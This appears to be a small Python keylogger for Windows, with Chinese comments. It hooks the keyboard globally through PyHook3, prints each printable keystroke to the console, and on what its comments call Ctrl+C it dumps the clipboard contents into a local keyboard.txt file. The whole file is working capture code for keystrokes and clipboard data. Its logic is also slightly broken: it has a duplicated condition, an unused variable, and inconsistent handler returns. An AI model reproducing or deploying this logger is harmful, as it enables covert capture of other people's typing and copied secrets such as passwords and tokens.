import os
import win32clipboard
import PyHook3
import pythoncom

path = os.getcwd()
file_save = path + os.path.sep + "keyboard.txt"


def OnKeyboardEvent(event):
    # 检测击键是否常规按键（非组合键等）  
    if 32 < event.Ascii < 127:
        print(event.Key)
    else:
        # 如果发现键盘按下组合键<Ctrl+C>事件，就把粘贴板内容保存到本地文件中
        if event.Key == "C":
            if event.Key == "C":
                win32clipboard.OpenClipboard()
                paste_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print()
                print("剪贴板内容已经保存到文件 " + file_save)
                print("-" * 32)
                print(paste_value)
                print("-" * 32)
                print()
                with open(file_save, "a") as f:
                    f.writelines("\n" + paste_value + "\n")
            return True

# 循环监听下一个击键事件


hm = PyHook3.HookManager()  # 创建一个HOOK管理对象
hm.KeyDown = OnKeyboardEvent  # 绑定键盘处理函数--就是我们创建的函数
hm.HookKeyboard()  # 初始化
data = []
pythoncom.PumpMessages()
